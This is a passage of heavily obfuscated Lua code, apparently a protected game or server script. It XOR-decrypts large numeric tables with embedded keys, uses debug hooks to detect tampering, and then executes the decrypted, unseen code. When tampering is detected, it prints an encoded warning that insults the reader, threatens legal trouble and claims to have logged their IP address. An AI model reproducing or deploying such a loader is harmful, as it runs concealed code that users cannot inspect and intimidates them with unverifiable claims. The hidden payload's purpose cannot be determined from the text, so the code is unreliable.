  89, 112, 24, 12, 98, 89, 123, 21, 33, 80, 24, 31, 38, 114, 89, 37, 47, 113, 112, 50, 5, 47, 24, 83, 40, 77, 64, 38, 38,
  79, 247, 32, 85, 38, 218, 114, 21, 62, 111, 204, 207, 73, 44, 115, 55, 139, 249, 24, 99, 101, 99, 30, 100, 55, 93, 30,
  74, 120, 54, 42, 76, 82, 38, 54, 20, 88, 65, 9, 45, 38, 127, 237, 74, 100, 18, 69, 92, 18, 75, 119, 29, 91, 111, 31, 2,
  99, 5, 43, 3, 8, 40, 2, 115, 76, 225, 112, 205, 7, 68, 16, 230, 81, 93, 14, 51, 94, 0, 23, 86, 86, 58, 88, 115, 115,
  114, 64, 61, 154, 0, 48, 63, 32, 47, 106, 63, 109, 61, 94, 44, 112, 11, 106, 53, 17, 7, 2, 39, 204, 72, 18, 126, 82, 9,
  112, 87, 74, 161, 43, 185, 65, 159, 126, 110, 116, 44, 195, 49, 114, 213, 88, 39, 40, 111, 106, 95, 111, 113, 61, 67,
  249, 99, 120, 178, 11, 38, 69, 23, 62, 144, 35, 76, 78, 106, 4, 56, 94, 46, 118, 20, 114, 98, 252, 194, 11, 90, 43,
  116, 124, 112, 87, 92, 77, 87, 172, 82, 11, 48, 115, 79, 38, 62, 34, 54, 62, 87, 123, 86, 55, 99, 99, 124, 111, 34,
  166, 63, 23, 117, 126, 117, 71, 107, 83, 101, 23, 107, 47, 120, 54, 111, 46, 58, 87, 18, 81, 49, 78, 113, 18, 116, 81,
  82, 44, 48, 57, 34, 62, 2, 57, 11, 42, 166, 99, 35, 21, 95, 115, 81, 142, 89, 31, 60, 62, 69, 39, 32, 76, 40, 115, 70,
  111, 7, 29, 228, 62, 14, 60, 99, 112, 108, 231, 46, 60, 126, 107, 109, 99, 39, 17, 215, 106, 60, 80, 114, 108, 109, 37,
  115, 18, 34, 119, 23, 59, 214, 20, 25, 55, 5, 115, 145, 3, 133, 64, 81, 107, 11, 63, 77, 127, 39, 111, 33, 39, 14, 66,
  61, 83, 33, 51, 104, 25, 114, 15, 65, 24, 72, 118, 54, 221, 96, 63, 32, 143, 107, 74, 54, 1, 100, 81, 120, 27, 103, 94,
  10, 24, 126, 54, 51, 36, 81, 117, 1, 49, 69, 118, 99, 118, 119, 153 }, "aB8TP8lSqV2XROSJCL7nMmCR47"); wKGBMPTi2PFcCtSmIdcTpVdpZ14Ed5So5esb53nM9K89q0EVGnTaEyPEx6VQwiUfBLxjDB0xA =
c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo; l2TsieijrGjdYmbGgfXDpNC0y5mKbbRiaqLJF6s9JKfgAQzKm0Epe7MKzsDlmfCqIwAjsy =
c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo; t9MCTFqb0rue3Oaix5NfmBgaovRKDQUIXLP9ygcqlE5pnjBWJeI7NQdriPe47Z7isx =
l2TsieijrGjdYmbGgfXDpNC0y5mKbbRiaqLJF6s9JKfgAQzKm0Epe7MKzsDlmfCqIwAjsy; wsPM7cDUiU8Gxn4RrSVi1YWbiQl4yh8MmJ9uurQvgAy1U2pFCjX =
t9MCTFqb0rue3Oaix5NfmBgaovRKDQUIXLP9ygcqlE5pnjBWJeI7NQdriPe47Z7isx; w5FHB3xoBim31c16Q4O80QWYQCWmFHlZfjmAegdrp3g7ErwgFmc1g =
wsPM7cDUiU8Gxn4RrSVi1YWbiQl4yh8MmJ9uurQvgAy1U2pFCjX; y6hD5LCqnoUUYnOH8gLtF3YQT3I2PzsaQIYPM4IHNCqZ8a3gienxfqTxHCW8OF9WW =
w5FHB3xoBim31c16Q4O80QWYQCWmFHlZfjmAegdrp3g7ErwgFmc1g; vbkd8ze9HWs2G9mn0U5NuS7Kxjgd5w8TRVcRkeTu2B29DJ7AbV9m50ijXiuskv =
y6hD5LCqnoUUYnOH8gLtF3YQT3I2PzsaQIYPM4IHNCqZ8a3gienxfqTxHCW8OF9WW; qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl =
vbkd8ze9HWs2G9mn0U5NuS7Kxjgd5w8TRVcRkeTu2B29DJ7AbV9m50ijXiuskv; hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o = function(
  a)
  K, F = 1529725331117722, 16384 + 8675; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; t0X88sPqvTwXXr3OOOobvtdhRnZmGiOfAeXiXgonKwHaKq36MpEOdZfEsVIj2ZMP76tw = function(b)
  co = coroutine.create(b)
  rVaURXlt5KMZqQjntYaZyuJ8KqdJAPJSg6SXv1BR6eA59W0SV4763fgSJgzYnYiQaYAU = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(rVaURXlt5KMZqQjntYaZyuJ8KqdJAPJSg6SXv1BR6eA59W0SV4763fgSJgzYnYiQaYAU, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return rVaURXlt5KMZqQjntYaZyuJ8KqdJAPJSg6SXv1BR6eA59W0SV4763fgSJgzYnYiQaYAU
end; raMgRzFXYjQ9QvOdoDlwX6pyDBZTmCv986sjRUdgKyHiyIvEDstC = function(f, g)
  mckrRMWSJeXM6l9hMjPlY1pi2CVaNA4snRg39uFiZQJMreuZaZYBWy3pUb07sPOZTNrR3RL = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; jJQ05uqTJ3sPKo2aM9oUO4HiTVMPjk1iw3G26wB4oroIGFksrApp = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; ecA3rD2cLUKkXPnVV8xNXyFOaKEO3kmrfx7CzZ7CZhYGrle1Jcr = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      mckrRMWSJeXM6l9hMjPlY1pi2CVaNA4snRg39uFiZQJMreuZaZYBWy3pUb07sPOZTNrR3RL(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; qU4s3DkLSnDebl2xLZo0CtR5KVVAQZVnNWkZPWjNtqTd6Yd2NZ31x7983CC = function(p, n)
    n3DtXrgsRMYTmfDBPMYaBsV3HNQMsJ2Wp6LYwwxs2wSo3ZdNEZ66WHwKztByJZsL = ""
    for k, q in pairs(p) do n3DtXrgsRMYTmfDBPMYaBsV3HNQMsJ2Wp6LYwwxs2wSo3ZdNEZ66WHwKztByJZsL =
      n3DtXrgsRMYTmfDBPMYaBsV3HNQMsJ2Wp6LYwwxs2wSo3ZdNEZ66WHwKztByJZsL ..
      qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl
      [hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('3E') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('F1') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('8B') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('40') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('BF') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('DA')]
      [hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('0E') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('8D') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('A8') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('8B')](
      q) end
    ; n(n3DtXrgsRMYTmfDBPMYaBsV3HNQMsJ2Wp6LYwwxs2wSo3ZdNEZ66WHwKztByJZsL)
  end; jJQ05uqTJ3sPKo2aM9oUO4HiTVMPjk1iw3G26wB4oroIGFksrApp(f,
    function(r) ecA3rD2cLUKkXPnVV8xNXyFOaKEO3kmrfx7CzZ7CZhYGrle1Jcr(r, g,
        function(s) qU4s3DkLSnDebl2xLZo0CtR5KVVAQZVnNWkZPWjNtqTd6Yd2NZ31x7983CC(s,
            function(t) if #t0X88sPqvTwXXr3OOOobvtdhRnZmGiOfAeXiXgonKwHaKq36MpEOdZfEsVIj2ZMP76tw(qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl[hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('59') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('72') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('A8') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('C1')]) == 1 then if qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl[hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('59') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('72') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('A8') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('C1')] == qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl[hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('25') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('8B') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('40') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('BF') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('F1')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl[hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('59') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('72') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('A8') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('C1')](t) then
                    qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl
                        [hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('59') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('72') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('A8') .. hmL7MoDHgk9xQbzZDfoE8h5KIS7T4tv6QhWyA18fOktyNT0HSIxAtePB28da4UarP5bmEuOl35o('C1')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; raMgRzFXYjQ9QvOdoDlwX6pyDBZTmCv986sjRUdgKyHiyIvEDstC(
{ 1050, 1165, 854, 608, 1055, 758, 1199, 1191, 665, 1008, 736, 962, 1179, 823, 807, 893, 595, 620, 1054, 853, 918, 1015,
  610, 1130, 657, 685, 564, 847, 941, 877, 958, 946, 561, 683, 1156, 1204, 933, 900, 1030, 641, 585, 772, 896, 930, 690,
  607, 963, 861, 924, 951, 1137, 890, 571, 1113, 600, 1160, 871, 803, 716, 1184, 842, 770, 866, 904, 615, 923, 761, 744,
  651, 751, 873, 840, 825, 739, 673, 596, 903, 682, 550, 1074, 791, 886, 851, 804, 546, 1128, 1135, 692, 681, 1056, 968,
  559, 796, 992, 1020, 667, 1197, 801, 1102, 821, 591, 1043, 824, 672, 1033, 1080, 793, 1023, 1203, 754, 819, 955, 984,
  1068, 548, 1005, 977, 1029, 586, 875, 1087, 705, 777, 1016, 841, 1143, 619, 638, 1027, 1026, 1152, 1051, 964, 576, 664,
  938, 787, 1061, 730, 792, 1081, 696, 990, 1035, 960, 775, 1118, 1052, 727, 1099, 870, 880, 838, 630, 662, 670, 1053,
  1131, 669, 1064, 762, 714, 666, 925, 742, 654, 852, 652, 552, 905, 876, 1183, 969, 1188, 582, 1089, 919, 850, 687, 588,
  721, 544, 830, 1200, 740, 704, 913, 1097, 605, 937, 1063, 719, 949, 1120, 1009, 1157, 867, 691, 976, 989, 906, 753,
  702, 872, 731, 575, 829, 668, 1144, 1072, 800, 781, 1206, 618, 1196, 612, 579, 897, 832, 961, 934, 732, 631, 986, 563,
  711, 1139, 891, 831, 1107, 723, 763, 570, 703, 1082, 755, 1181, 573, 1159, 745, 972, 725, 769, 1149, 865, 558, 1177,
  883, 776, 812, 1175, 566, 1021, 1121, 1085, 888, 826, 878, 1095, 583, 1150, 1036, 555, 907, 655, 734, 1162, 728, 1168,
  590, 1049, 757, 593, 765, 995, 1151, 869, 895, 738, 848, 1111, 574, 1071, 785, 741, 577, 1093, 974, 602, 953, 764,
  1062, 957, 1034, 970, 545, 942, 660, 784, 1192, 650, 629, 747, 752, 639, 1198, 759, 1040, 1155, 1167, 887, 718, 689,
  862, 1077, 617, 614, 1012, 589, 973, 1186, 1088, 1019, 794, 1001, 1172, 914, 671, 1212, 975, 1041, 833, 806, 557, 790,
  1032, 1170, 1022, 808, 694, 706, 549, 1096, 774, 994, 1002, 1116, 553, 722, 715, 603, 786, 1046, 627, 695, 980, 948,
  1119, 1138, 797, 568, 581, 1146, 795, 1142, 1060, 1083, 815, 556, 1133, 1094, 892, 598, 645, 547, 805, 898, 1147, 1207,
  748, 649, 1163, 1006, 1091, 562, 1017, 910, 1189, 1004, 709, 1129, 717, 1103, 909, 1209, 737, 677, 983, 1193, 708,
  1075, 811, 1153, 947, 959, 965, 789, 1028, 1045, 928, 1078, 580, 1132, 1104, 599, 678, 636, 954, 996, 822, 632, 735,
  688, 881, 572, 680, 569, 679, 814, 1109, 750, 846, 1190, 810, 828, 894, 899, 997, 623, 1070, 622, 1176, 827, 616, 1169,
  565, 554, 1180, 1195, 845, 1164, 611, 1117, 773, 1154, 1011, 1187, 855, 952, 1024, 956, 882, 1105, 626, 818, 902, 644,
  911, 1210, 698, 1122, 1079, 1092, 578, 820, 966, 1090, 1173, 1108, 988, 916, 945, 1208, 985, 1201, 1084, 1013, 943,
  697, 686, 921, 798, 1003, 1145, 642, 766, 1211, 1136, 837, 724, 637, 560, 809, 700, 1059, 587, 929, 816, 1098, 1065,
  663, 604, 982, 746, 707, 885, 710, 856, 884, 979, 1194, 874, 1166, 778, 940, 987, 967, 628, 843, 1178, 981, 584, 658,
  908, 1185, 1018, 771, 647, 813, 1007, 1140, 1123, -1, 40, 66, 100, 66, 117, 38, 15, 29, 28, 74, 47, 5, 15, 81, 79, 1,
  101, 85, 14, 48, 87, 4, 25, 103, 90, 103, 117, 53, 77, 88, 56, 8, 82, 24, 30, 83, 5, 65, 85, 107, 27, 61, 81, 1, 73,
  68, 78, 57, 61, 72, 24, 239, 18, 89, 210, 88, 120, 65, 187, 94, 77, 44, 81, 103, 120, 24, 105, 50, 100, 82, 212, 9, 25,
  79, 15, 66, 34, 59, 109, 61, 40, 128, 164, 85, 104, 85, 61, 82, 81, 81, 183, 16, 34, 2, 66, 27, 56, 25, 101, 77, 208,
  44, 106, 173, 97, 56, 87, 23, 87, 93, 208, 109, 95, 226, 59, 74, 202, 31, 119, 116, 22, 81, 48, 84, 100, 93, 70, 73,
  97, 1, 96, 105, 195, 61, 12, 10, 73, 106, 48, 73, 89, 242, 26, 79, 127, 66, 65, 46, 111, 57, 98, 65, 87, 7, 118, 72,
  15, 106, 193, 100, 38, 77, 117, 21, 57, 47, 11, 34, 104, 243, 42, 70, 99, 1, 21, 28, 109, 135, 127, 59, 40, 121, 16,
  240, 100, 24, 126, 14, 107, 79, 64, 16, 83, 33, 26, 41, 80, 88, 118, 84, 252, 59, 2, 51, 25, 104, 58, 18, 43, 43, 104,
  21, 21, 105, 10, 28, 57, 238, 24, 86, 7, 21, 55, 65, 159, 249, 11, 36, 80, 104, 1, 7, 33, 1, 100, 15, 127, 125, 77,
  115, 213, 65, 1, 101, 78, 15, 3, 103, 27, 106, 8, 13, 1, 76, 79, 85, 207, 77, 119, 157, 18, 28, 73, 118, 0, 11, 88, 45,
  29, 114, 70, 77, 87, 101, 89, 37, 16, 66, 3, 74, 32, 54, 51, 52, 67, 108, 106, 74, 36, 117, 112, 211, 12, 117, 21, 115,
  15, 52, 127, 17, 95, 194, 27, 39, 14, 35, 107, 92, 31, 102, 109, 4, 36, 92, 180, 153, 185, 75, 3, 65, 54, 67, 119, 50,
  73, 40, 30, 113, 3, 72, 35, 65, 60, 86, 66, 16, 222, 94, 85, 53, 49, 82, 11, 74, 42, 10, 29, 23, 53, 127, 61, 109, 36,
  87, 99, 77, 118, 64, 18, 12, 120, 73, 105, 125, 13, 105, 24, 53, 11, 2, 93, 2, 164, 77, 2, 118, 113, 35, 103, 43, 45,
  40, 82, 153, 31, 120, 77, 43, 169, 126, 55, 2, 247, 104, 77, 24, 17, 31, 15, 117, 90, 72, 101, 1, 34, 108, 121, 141,
  25, 18, 3, 107, 16, 56, 64, 4, 28, 16, 13, 25, 113, 14, 41, 85, 78, 1, 78, 86, 251, 23, 85, 17, 104, 91, 31, 50, 78,
  104, 16, 100, 85, 29, 104, 104, 23, 73, 111, 77, 238, 96, 201, 66, 20, 65, 12, 249, 0, 110, 8, 1, 120, 52, 10, 108, 53,
  62, 95, 195, 55, 7, 40, 201, 9, 119, 0, 111, 52, 80, 42, 7, 12, 60, 137, 100, 60, 43, 44, 103, 40, 85, 77, 85, 53, 8,
  254, 214, 109, 1, 108, 51, 85, 112, 36, 81, 122, 5, 48, 103, 7, 59, 95, 108, 23, 5, 215, 103, 117, 4, 85, 78, 77, 70,
  39, 83, 194, 106, 97, 17, 34, 70, 211, 13, 45, 70, 21, 116, 96, 6, 60, 25, 65, 38, 58, 22, 87, 47, 124, 88, 112, 81, 5,
  69, 59, 9, 84, 29, 43, 164, 140, 38, 4, 92, 36, 211, 9, 117, 101, 17, 121, 163, 20, 38, 178, 16, 54, 5, 112, 78, 57,
  72, 11, 32, 68, 39, 203, 7, 25, 27, 84, 101, 84, 254, 29, 4, 120, 118, 28, 56, 245, 9, 101, 85, 78, 59, 101, 178, 98,
  31, 46, 103, 87, 12, 111, 88, 118, 241, 20, 9, 41, 13, 104, 31, 49, 65, 16, 87, 65, 120, 180, 55, 106, 98, 88, 78, 25,
  13, 63, 1, 17, 35, 121, 30, 81, 16, 89, 122, 85, 19, 24, 101, 12, 77, 11, 80, 108, 57, 16, 83, 18, 248, 81, 41, 227,
  66, 81, 81, 81, 69, 4, 125 }, "maajqsbuxJUimEqHwHLPVoGuXn"); bhuGB1QBFplaSmMnjXbGu57alKHSyMxfNox1ftLM8YmnkUogmvMEm1DKQE =
qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl; fcsvFlmBRXt3EE6khlCNEhG4MBpCpwztV0t4qVe0vYUpxjjFvsoL7L64BLgqaXF7IzKr =
qZ3WIHqoHK3Jax1rEH4q40h0loWhTnZMFTeMGhBjfBX4DM820MvoeLqqZOyl; dK9sKW3FMKrZDc3WRoWUJ9vKWrr9YVU8ViAzL4rnmNZefaHbBjJgdAEduCNKx7wGHbBxVt =
fcsvFlmBRXt3EE6khlCNEhG4MBpCpwztV0t4qVe0vYUpxjjFvsoL7L64BLgqaXF7IzKr; l2stC1Dd3pfppMD6VFUYFSpQOeyK386K6qTorGTKirjOqhAcama =
dK9sKW3FMKrZDc3WRoWUJ9vKWrr9YVU8ViAzL4rnmNZefaHbBjJgdAEduCNKx7wGHbBxVt; t8Zf0LXKA6vcVWHAMr9QMqqX68WFuiVa2LrpnKaYszT1XNsR7D7xX6oFZ7nARTytS =
l2stC1Dd3pfppMD6VFUYFSpQOeyK386K6qTorGTKirjOqhAcama; gbtlIuBIrebvnvF1D5FAyt8rlvyVBZByu7HuEoVkuoWoA7T69dhPhxRyZ5aepmUz7AC4CvZwgmm =
t8Zf0LXKA6vcVWHAMr9QMqqX68WFuiVa2LrpnKaYszT1XNsR7D7xX6oFZ7nARTytS; swaJRhuyt7gAUzGuIlKOSdOvT6zx3SMIsPn6roIxKjel873HblBb48cIChuZ36AxptJX =
gbtlIuBIrebvnvF1D5FAyt8rlvyVBZByu7HuEoVkuoWoA7T69dhPhxRyZ5aepmUz7AC4CvZwgmm; oefxOe7t5oL14ZVm1yUoJnM9QZ2f2cjyDbKigR11IdwkHwnaMb43zyY73y1ylZkr9Tkn53QA =
swaJRhuyt7gAUzGuIlKOSdOvT6zx3SMIsPn6roIxKjel873HblBb48cIChuZ36AxptJX; qdUkrM0MzPw1ypO4WFyKbbbJQYSJloG0RVKmceTOHCXTJwYzSv9yWZrSL =
oefxOe7t5oL14ZVm1yUoJnM9QZ2f2cjyDbKigR11IdwkHwnaMb43zyY73y1ylZkr9Tkn53QA; qKh9PDq8jch5sASXeCWDPjywkN1B0YJSOxysbEcBvJcW8ITyYdIy44CaimgfAdCLUz2gO =
qdUkrM0MzPw1ypO4WFyKbbbJQYSJloG0RVKmceTOHCXTJwYzSv9yWZrSL; eu37NPPxlBlpF5MkiCrDCv22B9XIrtRCqhEKRhjxBGC5U2tJI5lPZgCFvmWQ3FNFNRC7 =
qKh9PDq8jch5sASXeCWDPjywkN1B0YJSOxysbEcBvJcW8ITyYdIy44CaimgfAdCLUz2gO; hOe7dSr010SHOm9yH6psdOhEXGZhAeKFWiL0hlV6feCnMY70uE0ODF5lTWOQ = function(
  a)
  K, F = 5260859846145108, 16384 + 8328; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; mm2iiV7EiLtdvFJUTP85cx527qaqMNNFfAAjJklG0ohjwyBnU9hYXdH9v0jj2JM = function(b)
  co = coroutine.create(b)
  x7NKLhvK1JgrdKMtD8NDNM85AD8wki1RLFFMLnUNBJjL4LPrAiuP5frAsECI3gpEZs = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(x7NKLhvK1JgrdKMtD8NDNM85AD8wki1RLFFMLnUNBJjL4LPrAiuP5frAsECI3gpEZs, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return x7NKLhvK1JgrdKMtD8NDNM85AD8wki1RLFFMLnUNBJjL4LPrAiuP5frAsECI3gpEZs
end; yWaKUYjFoGmzgLi9jofcpKpECwu7zeTFEhrGdiQvpi21kwXmTLKvoSJ = function(f, g)
  ulHoC32R6gNfG1sWYO5tnW4S4opKZ2gpu1HE33OUuGwoKr4d8ttILNgfF1LE9hIftD = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; f8nDuToNAH5bdSzZXCgmI9Ky7jaBvgHgD4kPHIwxvBm1YAlw6foDCE7CnAxA8tiMNXFS = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; hQBY53L03ORIfbX1r26vOnkovDUVXT5fbReDHFfhOOmipWCjCT3MYKHgiuGmbzBNw16603CEvh = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      ulHoC32R6gNfG1sWYO5tnW4S4opKZ2gpu1HE33OUuGwoKr4d8ttILNgfF1LE9hIftD(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; rXponvRT0J4u1u9o3q82EbOfUMzZx6FuFLXR4Zk583bp7xdbHJLu1i = function(p, n)
    xckYb0YSVtDqvZU4Ohv0KVDRy1g1CLd8jxxBuFvANuMPfh4DrTchBniH4DU6V2a9hsmnpSaW = ""
    for k, q in pairs(p) do xckYb0YSVtDqvZU4Ohv0KVDRy1g1CLd8jxxBuFvANuMPfh4DrTchBniH4DU6V2a9hsmnpSaW =
